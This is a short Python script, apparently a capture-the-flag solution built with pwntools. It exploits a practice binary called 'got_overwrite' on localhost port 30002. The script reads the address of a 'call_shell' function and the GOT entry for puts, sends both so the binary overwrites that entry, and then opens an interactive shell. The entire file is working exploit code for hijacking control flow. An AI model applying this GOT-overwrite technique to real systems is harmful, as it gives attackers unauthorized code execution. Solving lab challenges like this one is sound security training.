from pwn import *

elf = ELF('./got_overwrite')

call_shell_addr = elf.symbols['call_shell']
puts_got_addr = elf.got['puts']

io = remote('localhost', 30002)
# io = process('./got_overwrite')

io.sendline(hex(puts_got_addr).encode())
io.sendline(hex(call_shell_addr).encode())

io.interactive()
